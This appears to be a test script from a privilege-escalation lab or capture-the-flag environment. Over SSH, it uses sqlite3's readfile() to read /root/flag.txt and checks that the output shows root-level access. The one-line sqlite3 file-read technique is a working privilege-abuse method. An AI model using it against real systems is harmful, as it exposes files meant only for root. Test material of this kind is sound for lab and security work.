#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '/usr/bin/sqlite3 /dev/null "SELECT readfile('"'"'/root/flag.txt'"'"');"')"
assert_root_output "${out}"
